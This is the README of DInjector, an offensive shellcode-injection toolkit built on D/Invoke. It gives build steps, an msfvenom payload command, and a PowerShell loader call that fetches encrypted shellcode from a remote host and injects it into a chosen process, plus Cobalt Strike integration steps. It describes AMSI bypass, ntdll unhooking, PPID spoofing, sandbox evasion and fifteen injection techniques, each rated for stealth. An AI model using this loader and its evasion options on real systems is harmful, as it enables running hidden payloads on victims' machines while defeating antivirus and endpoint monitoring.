DInjector
==========

```
     (    (
     )\ ) )\ )                   )             (   (  (
    (()/((()/(     (    (     ( /(    (        )\ ))\ )\
     /(_))/(_))(   )\  ))\ (  )\())(  )(      (()/((_|(_)
    (_))_(_))  )\ |(_)/((_))\(_))/ )\(()\      ((_))  _
     |   \_ _|_(_/( !(_)) ((_) |_ ((_)((_)     _| | || |
     | |) | || ' \)) / -_) _||  _/ _ \ '_|  _/ _` | || |
     |___/___|_||_|/ \___\__| \__\___/_|   (_)__,_|_||_|
                 |__/-----------------------------------
                                                K E E P
                                                C A L M
                                                  A N D
                                       D / I N 💉 E C T
                                      S H E L L C O D E
```

---

This repository is an accumulation of code snippets for various **shellcode injection** techniques using fantastic [D/Invoke](https://thewover.github.io/Dynamic-Invoke/) API by [@TheWover](https://twitter.com/therealwover) and [@FuzzySecurity](https://twitter.com/fuzzysec).

Features:

* Based entirely on D/Invoke API (using [minified fork](https://github.com/snovvcrash/DInvoke/tree/minified) of [DInvoke-dev](https://github.com/TheWover/DInvoke/tree/dev))
* Encrypted payloads which can be invoked from a URL or passed in base64 as an argument
* PPID Spoofing and [block non-Microsoft DLLs](https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes) (stolen from [TikiTorch](https://github.com/rasta-mouse/TikiTorch))
* Flexible adjustment options for memory protection values
* Shellcode fluctuation with **RW** and memory obfuscation (adopted from [ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation))
* Built-in AMSI bypass for local and remote processes, amsi.dll can be optionally force loaded
* Simple sandbox detection & evasion
* Prime numbers calculation to emulate sleep for in-memory scan evasion
* Ntdll.dll unhooking
* Cobalt Strike integration

> **DISCLAIMER.** All information contained in this repository is provided for educational and research purposes only. The author is not responsible for any illegal use of this tool.

## Table of Contents

- [DInjector](#dinjector)
  * [Table of Contents](#table-of-contents)
  * [Basic Usage](#basic-usage)
  * [Cobalt Strike Integration](#cobalt-strike-integration)
  * [Arguments](#arguments)
  * [Techniques](#techniques)
    + [FunctionPointer](#functionpointer)
    + [FunctionPointerUnsafe](#functionpointerunsafe)
    + [TimeFormats](#timeformats)
    + [ClipboardPointer](#clipboardpointer)
    + [CurrentThread](#currentthread)
    + [CurrentThreadUuid](#currentthreaduuid)
    + [RemoteThread](#remotethread)
    + [RemoteThreadDll](#remotethreaddll)
    + [RemoteThreadView](#remotethreadview)
    + [RemoteThreadSuspended](#remotethreadsuspended)
    + [RemoteThreadKernelCB](#remotethreadkernelcb)
    + [RemoteThreadAPC](#remotethreadapc)
    + [RemoteThreadContext](#remotethreadcontext)
    + [ProcessHollowing](#processhollowing)
    + [ModuleStomping](#modulestomping)
    + [Utils](#utils)
      - [AM51](#am51)
      - [SpawnProcess](#spawnprocess)
      - [Unhooker](#unhooker)
  * [Credits](#credits)

## Basic Usage

1. Compile the project in Visual Studio (1) or via [OffensivePipeline](https://github.com/snovvcrash/OffensivePipeline) (2):

```console
PS (1) > git clone --recurse-submodules https://github.com/snovvcrash/DInjector.git
PS (1) > cd DInjector/DInjector
PS (1) > devenv /build Release DInjector.sln
PS (1) > ls .\bin\Release\DInjector.dll

PS (2) > curl https://github.com/snovvcrash/OffensivePipeline/releases/download/v0.8.2/OffensivePipeline_v0.8.2_DInjector.zip -o OffensivePipeline.zip
PS (2) > Expand-Archive .\OffensivePipeline.zip -DestinationPath .\OffensivePipeline
PS (2) > cd OffensivePipeline
PS (2) > .\OffensivePipeline.exe t DInjector
PS (2) > ls .\Output\DInjector_*\DInjector.dll
```

2. Generate a shellcode of your choice:

```console
~$ msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f raw -o shellcode.bin
```

3. [Encrypt](encrypt.py) the shellcode:

```console
~$ ./encrypt.py shellcode.bin -p 'Passw0rd!' -o enc
```

4. Serve the encrypted shellcode:

```console
~$ sudo python3 -m http.server 80
```

5. Use the PowerShell download [cradle](/cradle.ps1) to load DInjector.dll as `System.Reflection.Assembly` and execute it from memory.

:warning: The assembly will very likely be flagged if put on disk!

Test it locally with PowerShell:

```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\DInjector.dll")
$assem = [System.Reflection.Assembly]::Load($bytes)
[DInjector.Detonator]::Boom("remotethread /sc:http://10.10.13.37/enc /p:Passw0rd! /pid:1337 /am51:True")
```

## Cobalt Strike Integration

In order to use DInjector from Cobalt Strike:

1. Change project's output type to Console Application.
2. Replace some strings:

```powershell
$detonator = gc .\Detonator.cs
$detonator = $detonator -creplace "Boom", "Main"
$detonator = $detonator -creplace "Main\(string command\)", "Main(string[] args)"
$detonator = $detonator -creplace "var args = command.Split\(\);", "//var args = command.Split();"
$detonator > .\Detonator.cs
```

3. Compile the assembly and put it next to the Aggressor script.

![cs](https://user-images.githubusercontent.com/23141800/169656256-143f6cfa-0a33-4869-9bce-f7b1d58686e2.png)

## Arguments

| Name           | Techniques                                                                                                                                                                                 | Required | Default Value          | Example Values                                                                    | Description                                                                                                                                                   |
|----------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------|------------------------|-----------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `/sc`          | All                                                                                                                                                                                        | YES      | -                      | `http://10.10.13.37/enc`                                                          | Sets shellcode path (can be loaded from URL or as a base64 string).                                                                                           |
| `/p`           | All                                                                                                                                                                                        | YES      | -                      | `Passw0rd!`                                                                       | Sets password to decrypt the shellcode.                                                                                                                       |
| `/protect`     | CurrentThread                                                                                                                                                                              | NO       | `RX`                   | `RX` / `RWX`                                                                      | Sets memory protection for the shellcode.                                                                                                                     |
| `/timeout`     | CurrentThread                                                                                                                                                                              | NO       | `0` (serve forever)    | `5000`                                                                            | Sets timeout for WaitForSingleObject (ms) for the injector to do extra cleanup afterwards.                                                                    |
| `/flipSleep`   | CurrentThread                                                                                                                                                                              | NO       | `0` (do NOT flip)      | `10000`                                                                           | Sets time to sleep with PAGE_NOACCESS on shellcode (ms).                                                                                                      |
| `/fluctuate`   | CurrentThread                                                                                                                                                                              | NO       | `0` (do NOT fluctuate) | `RW`                                                                              | Sets memory protection for the shellcode to fluctuate on Sleep with.                                                                                          |
| `/image`       | RemoteThreadKernelCB, RemoteThreadAPC, RemoteThreadContext, ProcessHollowing, ModuleStomping                                                                                               | YES      | -                      | `C:\Windows\System32\svchost.exe`, `C:\Program*Files\Mozilla*Firefox\firefox.exe` | Sets path to the image of a newly spawned sacrifical process to inject into. If there're spaces in the image path, replace them with asterisk (*) characters. |
| `/pid`         | RemoteThread, RemoteThreadDll, RemoteThreadView, RemoteThreadSuspended                                                                                                                     | YES      | -                      | `1337`                                                                            | Sets existing process ID to inject into.                                                                                                                      |
| `/ppid`        | RemoteThreadKernelCB, RemoteThreadAPC, RemoteThreadContext, ProcessHollowing, ModuleStomping                                                                                               | NO       | `0`                    | `1337`                                                                            | Sets parent process ID to spoof the original value with.                                                                                                      |
| `/dll`         | RemoteThreadDll                                                                                                                                                                            | YES      | -                      | `msvcp_win.dll`                                                                   | Sets loaded DLL name to overwrite its .text section for storing the shellcode.                                                                                |
| `/stompDll`    | ModuleStomping                                                                                                                                                                             | YES      | -                      | `xpsservices.dll`                                                                 | Sets name of the DLL to stomp.                                                                                                                                |
| `/stompExport` | ModuleStomping                                                                                                                                                                             | YES      | -                      | `DllCanUnloadNow`                                                                 | Sets exported function name to overwrite.                                                                                                                     |
| `/sleep`       | All                                                                                                                                                                                        | NO       | `0`                    | `30`                                                                              | Sets number of seconds (approx.) to sleep before execution (10s-60s).                                                                                         |
| `/blockDlls`   | RemoteThreadKernelCB, RemoteThreadAPC, RemoteThreadContext, ProcessHollowing, ModuleStomping                                                                                               | NO       | `False`                | `True` / `False`                                                                  | Blocks 3rd-party (non-Microsoft) DLLs.                                                                                                                        |
| `/am51`        | All                                                                                                                                                                                        | NO       | `False`                | `True` / `False` / `Force`                                                        | Applies AMSI bypass in current process. amsi.dll can be loaded forcibly.                                                                                      |
| `/remoteAm51`  | RemoteThreadKernelCB, RemoteThreadAPC, RemoteThreadContext, ProcessHollowing, ModuleStomping, RemoteThreadKernelCB, RemoteThreadAPC, RemoteThreadContext, ProcessHollowing, ModuleStomping | NO       | `False`                | `True` / `False` / `Force`                                                        | Applies AMSI bypass in remote process. amsi.dll can be loaded forcibly.                                                                                       |
| `/unhook`      | All                                                                                                                                                                                        | NO       | `False`                | `True` / `False`                                                                  | Unhooks ntdll.dll (loads a clean copy from disk).                                                                                                             |
| `/debug`       | All                                                                                                                                                                                        | NO       | `False`                | `True` / `False`                                                                  | Print debug messages.                                                                                                                                         |

## Techniques

:warning: OpSec safe considerations are based on my personal usage experience and some testings along the way.

### [FunctionPointer](/DInjector/Modules/FunctionPointer.cs)

```yaml
module_name: 'functionpointer'
arguments:
description: |
  Allocates a memory region, copies the shellcode into it and executes it like a function.
api:
  - dynamic_invocation:
  - syscalls:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: false
references:
  - 'http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/'
  - 'https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis'
  - 'https://www.fergonez.net/post/shellcode-csharp'
```

### [FunctionPointerUnsafe](/DInjector/Modules/FunctionPointerUnsafe.cs)

```yaml
module_name: 'functionpointerunsafe'
arguments:
description: |
  Sets RX on a byte array (treated as an unsafe pointer) and executes it like a function.
api:
  - dynamic_invocation:
  - syscalls:
    1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: false
references:
  - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-2/'
  - 'https://github.com/jhalon/SharpCall/blob/master/Syscalls.cs'
```

### [TimeFormats](/DInjector/Modules/TimeFormats.cs)

```yaml
module_name: 'timeformats'
arguments:
description: |
  Allocates a memory region, copies the shellcode into it and executes EnumTimeFormatsEx against it.
  The memory region address is treated as a TIMEFMT_ENUMPROCEX callback function.
api:
  - dynamic_invocation:
    1: 'EnumTimeFormatsEx'
  - syscalls:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe:
references:
  - 'https://docs.microsoft.com/ru-ru/previous-versions/windows/desktop/legacy/dd317833(v=vs.85)'
  - 'https://docs.microsoft.com/ru-ru/windows/win32/api/winnls/nf-winnls-enumtimeformatsex?redirectedfrom=MSDN'
  - 'https://github.com/ReversingID/Shellcode-Loader/blob/master/windows/execution/callback/EnumTimeFormatsEx/c++/code.cpp'
```

:information_source: This is just one example of a whole bunch of API calls that expect a callback function as an argument and [can potentially be abused](https://github.com/aahmad097/AlternativeShellcodeExec) for shellcode execution.

### [ClipboardPointer](/DInjector/Modules/ClipboardPointer.cs)

```yaml
module_name: 'clipboardpointer'
arguments:
description: |
  Copies shellcode bytes into the clipboard, sets RX on it and executes it like a function.
api:
  - dynamic_invocation:
    1: 'OpenClipboard'
    2: 'SetClipboardData'
    3: 'CloseClipboard'
  - syscalls:
    1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: true
references:
  - 'https://gist.github.com/Wra7h/69a03c802ae6977e74b1152a4b004515'
```

### [CurrentThread](/DInjector/Modules/CurrentThread.cs)

```yaml
module_name: 'currentthread'
arguments: |
  /protect:RX
  /timeout:5000
  /flipSleep:10000
  /fluctuate:RW
description: |
  Injects shellcode into current process.
  Thread execution via NtCreateThreadEx (& NtResumeThread).
api:
  - dynamic_invocation:
    1: '[TIMEOUT] WaitForSingleObject'
  - syscalls:
    1: 'NtAllocateVirtualMemory (allocProtect)'
    2: 'NtProtectVirtualMemory (newProtect)'
    3: 'NtCreateThreadEx'
    4: '[FLIPSLEEP] NtProtectVirtualMemory (protect)'
    5: '[FLIPSLEEP] NtResumeThread'
    6: '[TIMEOUT] NtProtectVirtualMemory (PAGE_READWRITE)'
    7: '[TIMEOUT] NtFreeVirtualMemory (shellcode)'
    8: 'NtWaitForSingleObject'
    9: 'NtClose'
opsec_safe: false
references:
  - 'https://github.com/XingYun-Cloud/D-Invoke-syscall/blob/main/Program.cs'
  - 'https://github.com/mgeeky/ShellcodeFluctuation/blob/master/ShellcodeFluctuation/main.cpp'
```

:information_source: **Notes:**

* When using 3rd-party loader-independent encoders which require R**W**X memory to decode the shellcode (like [sgn](https://github.com/EgeBalci/sgn), available via `--sgn` switch in [`encrypt.py`](encrypt.py)), you can use the `/protect` option to set **RWX** (PAGE_EXECUTE_READWRITE, `0x40`) value on the memory region where the shellcode resides. Default protection is **RX** (PAGE_EXECUTE_READ, `0x20`).
* The `/timeout` option exists for staged payloads: when its value is non-zero, the operator forces `NtWaitForSingleObject` to time out initial (stager) shellcode execution in a specified number of milliseconds and then invoke the clean up routine to zero out stager's memory region and call `NtFreeVirtualMemory` on it.
* If you want to set initial protection for the memory region where the shellcode resides as **NA** (PAGE_NOACCESS, `0x01`) to evade potential in-memory scan, use the `/flipSleep` option to delay thread execution for a specified amount of milliseconds (same as in [RemoteThreadSuspended](#RemoteThreadSuspended)).
* Using the `/fluctuate` option you can instruct the loader to hook `kernel32.dll!Sleep` function and fluctuate the shellcode memory region with **RW** (PAGE_READWRITE, 0x02) memory obfuscation via XOR encryption on Sleep to evade in-memory scans hunting for known implant signatures. Heavily adopted from [ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation) PoC.

**Shellcode Fluctuation Demo**

<p align="center">
  <a href="https://vimeo.com/719398239"><img src="https://user-images.githubusercontent.com/23141800/173198600-7c878e2b-8ba9-4b6a-ae9f-16cfa8a2c83f.png" width="800px" alt="shellcode-fluctuation-demo" /></a>
</p>

### [CurrentThreadUuid](/DInjector/Modules/CurrentThreadUuid.cs)

```yaml
module_name: 'currentthreaduuid'
arguments:
description: |
  Injects shellcode into current process.
  Thread execution via EnumSystemLocalesA.
api:
  - dynamic_invocation:
    1: 'HeapCreate'
    2: 'UuidFromStringA'
    3: 'EnumSystemLocalesA'
  - syscalls:
opsec_safe: false
references:
  - 'https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/'
  - 'https://github.com/ChoiSG/UuidShellcodeExec/blob/main/USEConsole/Program.cs'
```

:information_source: **Notes:**

* This technique is appliable for small-[size](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate) payloads.
* Use `--uuid` switch in [`encrypt.py`](encrypt.py) to format the shellcode for this technique.

### [RemoteThread](/DInjector/Modules/RemoteThread.cs)

```yaml
module_name: 'remotethread'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote process.
  Thread execution via NtCreateThreadEx.
api:
  - dynamic_invocation:
  - syscalls:
    1: 'NtOpenProcess'
    2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    3: 'NtWriteVirtualMemory (shellcode)'
    4: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    5: 'NtCreateThreadEx'
    6: 'NtClose (x2)'
opsec_safe: false
references:
  - 'https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/SharpImpersonation/Shellcode.cs'
```

### [RemoteThreadDll](/DInjector/Modules/RemoteThreadDll.cs)

```yaml
module_name: 'remotethreaddll'
arguments: |
  /pid:1337
  /dll:msvcp_win.dll
description: |
  Injects shellcode into an existing remote process overwriting one of its loaded modules' .text section.
  Thread execution via NtCreateThreadEx.
api:
  - dynamic_invocation:
  - syscalls:
    1: 'NtOpenProcess'
    2: 'NtWriteVirtualMemory (shellcode)'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtCreateThreadEx'
    5: 'NtClose (x2)'
opsec_safe:
references:
  - 'https://www.netero1010-securitylab.com/eavsion/alternative-process-injection'
```

### [RemoteThreadView](/DInjector/Modules/RemoteThreadView.cs)

```yaml
module_name: 'remotethreadview'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote process.
  Thread execution via RtlCreateUserThread.
api:
  - dynamic_invocation:
    1: 'RtlCreateUserThread'
  - syscalls:
    1: 'NtOpenProcess'
    2: 'NtCreateSection (PAGE_EXECUTE_READWRITE)'
    3: 'NtMapViewOfSection (PAGE_READWRITE)'
    4: 'NtMapViewOfSection (PAGE_EXECUTE_READ)'
    5: 'NtUnmapViewOfSection'
    6: 'NtClose (x2)'
opsec_safe: false
references:
  - 'https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Sections%20Shellcode%20Process%20Injector/Program.cs'
```

### [RemoteThreadSuspended](/DInjector/Modules/RemoteThreadSuspended.cs)

```yaml
module_name: 'remotethreadsuspended'
arguments: |
  /pid:1337
  /flipSleep:10000
description: |
  Injects shellcode into an existing remote process and flips memory protection to PAGE_NOACCESS.
  After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
  Thread execution via NtCreateThreadEx & NtResumeThread.
api:
  - dynamic_invocation:
  - syscalls:
    1: 'NtOpenProcess'
    2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    3: 'NtWriteVirtualMemory (shellcode)'
    4: 'NtProtectVirtualMemory (PAGE_NOACCESS)'
    5: 'NtCreateThreadEx (CREATE_SUSPENDED)'
    6: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    7: 'NtResumeThread'
    8: 'NtClose (x2)'
opsec_safe: true
references:
  - 'https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/'
  - 'https://github.com/plackyhacker/Suspended-Thread-Injection/blob/main/injection.cs'
```

### [RemoteThreadKernelCB](/DInjector/Modules/RemoteThreadKernelCB.cs)

```yaml
module_name: 'remotethreadkernelcb'
arguments: |
  /image:C:\Windows\System32\notepad.exe
  /ppid:31337
  /blockDlls:True
  /remoteAm51:True
description: |
  Injects shellcode into a newly spawned sacrifical remote process.
  Thread execution via SendMessageA.
api:
  - dynamic_invocation:
     1: 'WaitForInputIdle'
     2: 'FindWindowExA'
     3: 'SendMessageA'
  - syscalls:
     1: 'NtQueryInformationProcess'
     2: 'NtReadVirtualMemory (kernelCallbackAddress)'
     3: 'NtReadVirtualMemory (kernelCallbackValue)'
     4: 'NtReadVirtualMemory (kernelStruct.fnCOPYDATA)'
     5: 'NtProtectVirtualMemory (PAGE_READWRITE)'
     6: 'NtWriteVirtualMemory (shellcode)'
     7: 'NtProtectVirtualMemory (oldProtect)'
     8: 'NtProtectVirtualMemory (PAGE_READWRITE)'
     9: 'NtWriteVirtualMemory (origData)'
    10: 'NtProtectVirtualMemory (oldProtect)'
    11: 'NtClose (x2)'
opsec_safe:
references:
  - 'https://t0rchwo0d.github.io/windows/Windows-Process-Injection-Technique-KernelCallbackTable/'
  - 'https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/'
  - 'https://gist.github.com/sbasu7241/5dd8c278762c6305b4b2009d44d60c13'
  - 'https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html'
```

:information_source: **Notes:**

* This technique requires a GUI process (e.g., notepad.exe) to inject into.
* Based on my testings a large payload (e.g., stageless meterpreter) will not work with this technique.
* The sacrifical process will crash anyways when the shellcode finishes its work.

### [RemoteThreadAPC](/DInjector/Modules/RemoteThreadAPC.cs)

```yaml
module_name: 'remotethreadapc'
arguments: |
  /image:C:\Windows\System32\svchost.exe
  /ppid:31337
  /blockDlls:True
  /remoteAm51:True
description: |
  Injects shellcode into a newly spawned sacrifical remote process.
  Thread execution via NtQueueApcThread.
api:
  - dynamic_invocation:
  - syscalls:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtWriteVirtualMemory (shellcode)'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtOpenThread'
    5: 'NtQueueApcThread'
    6: 'NtAlertResumeThread'
    7: 'NtClose (x2)'
opsec_safe: true
references:
  - 'https://rastamouse.me/exploring-process-injection-opsec-part-2/'
  - 'https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0'
```

### [RemoteThreadContext](/DInjector/Modules/RemoteThreadAPC.cs)

```yaml
module_name: 'remotethreadcontext'
arguments: |
  /image:C:\Windows\System32\svchost.exe
  /ppid:31337
  /blockDlls:True
  /remoteAm51:True
description: |
  Injects shellcode into a newly spawned sacrifical remote process.
  Thread execution via SetThreadContext & NtResumeThread.
api:
  - dynamic_invocation:
  - syscalls:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtWriteVirtualMemory (shellcode)'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtCreateThreadEx (CREATE_SUSPENDED)'
    5: 'GetThreadContext'
    6: 'SetThreadContext'
    7: 'NtResumeThread'
    8: 'NtClose (x2)'
opsec_safe: true
references:
  - 'https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/'
  - 'https://github.com/djhohnstein/CSharpSetThreadContext/blob/master/Runner/Program.cs'
```

### [ProcessHollowing](/DInjector/Modules/ProcessHollowing.cs)

```yaml
module_name: 'processhollowing'
arguments: |
  /image:C:\Windows\System32\svchost.exe
  /ppid:31337
  /blockDlls:True
  /remoteAm51:True
description: |
  Injects shellcode into a newly spawned sacrifical remote process.
  Thread execution via NtResumeThread (hollowing with shellcode).
api:
  - dynamic_invocation:
  - syscalls:
    1: 'NtQueryInformationProcess'
    2: 'NtReadVirtualMemory (ptrImageBaseAddress)'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)'
    4: 'NtWriteVirtualMemory (shellcode)'
    5: 'NtProtectVirtualMemory (oldProtect)'
    6: 'NtResumeThread'
    7: 'NtClose (x2)'
opsec_safe: false
references:
  - 'https://github.com/CCob/SharpBlock/blob/master/Program.cs'
```

### [ModuleStomping](/DInjector/Modules/ModuleStomping.cs)

```yaml
module_name: 'modulestomping'
arguments: |
  /image:C:\Windows\System32\svchost.exe
  /stompDll:xpsservices.dll
  /stompExport:DllCanUnloadNow
  /ppid:31337
  /blockDlls:True
  /remoteAm51:True
description: |
  Loads a trusted module from disk and overwrites one of its exported functions.
  Thread execution via NtCreateThreadEx.
api:
  - dynamic_invocation:
  - syscalls:
     1: 'NtAllocateVirtualMemory (bModuleNameLength, PAGE_READWRITE)'
     2: 'NtAllocateVirtualMemory (shimLength, PAGE_READWRITE)'
     3: 'NtWriteVirtualMemory (bModuleName)'
     4: 'NtWriteVirtualMemory (shim)'
     5: 'NtProtectVirtualMemory (shim, PAGE_EXECUTE_READ)'
     6: 'NtCreateThreadEx (shim)'
     7: 'NtWaitForSingleObject'
     8: 'NtFreeVirtualMemory (allocModule)'
     9: 'NtFreeVirtualMemory (allocShim)'
    10: 'NtProtectVirtualMemory (shellcode, PAGE_READWRITE)'
    11: 'NtWriteVirtualMemory (shellcode)'
    12: 'NtProtectVirtualMemory (shellcode, PAGE_EXECUTE_READ)'
    13: 'NtCreateThreadEx (shellcode)'
    14: 'NtClose (x3)'
opsec_safe: true
references:
  - 'https://offensivedefence.co.uk/posts/module-stomping/'
  - 'https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Stomper.cs'
```

### Utils

#### [AM51](/DInjector/Utils/AM51.cs)

```yaml
module_name: 'all'
arguments:
description:
api:
  - dynamic_invocation:
  - syscalls:
    1: '[FORCE] NtAllocateVirtualMemory (libNameLength, PAGE_READWRITE)'
    2: '[FORCE] NtWriteVirtualMemory (bLibName)'
    3: '[FORCE] NtCreateThreadEx (LoadLibraryA)'
    4: 'NtProtectVirtualMemory (PAGE_READWRITE)'
    5: '[REMOTE] NtWriteVirtualMemory (patch)'
    6: 'NtProtectVirtualMemory (oldProtect)'
opsec_safe:
references:
```

#### [SpawnProcess](/DInjector/Utils/SpawnProcess.cs)

```yaml
module_name: |
  remotethreadkernelcb
  remotethreadapc
  remotethreadcontext
  processhollowing
  modulestomping
arguments:
description:
api:
  - dynamic_invocation:
    1: 'InitializeProcThreadAttributeList'
    2: '[BLOCKDLLS] UpdateProcThreadAttribute'
    3: '[PPID] UpdateProcThreadAttribute'
    4: 'CreateProcessA'
  - syscalls:
opsec_safe:
references:
  - 'https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/'
```

#### [Unhooker](/DInjector/Utils/Unhooker.cs)

```yaml
module_name: 'all'
arguments:
description:
api:
  - dynamic_invocation:
    1: 'VirtualProtect (PAGE_EXECUTE_READWRITE)'
    2: 'CopyMemory'
    3: 'VirtualProtect (oldProtect)'
  - syscalls:
opsec_safe:
references:
  - 'https://github.com/TheWover/DInvoke/blob/0530886deebd1a2e5bd8b9eb8e1d8ce87f4ca5e4/DInvoke/DInvoke/DynamicInvoke/Generic.cs'
```

## Credits

* [@TheWover](https://twitter.com/therealwover) and [@FuzzySecurity](https://twitter.com/fuzzysec) for their awesome [DInvoke](https://github.com/TheWover/DInvoke) project.
* All those great researchers mentioned in technique references above.

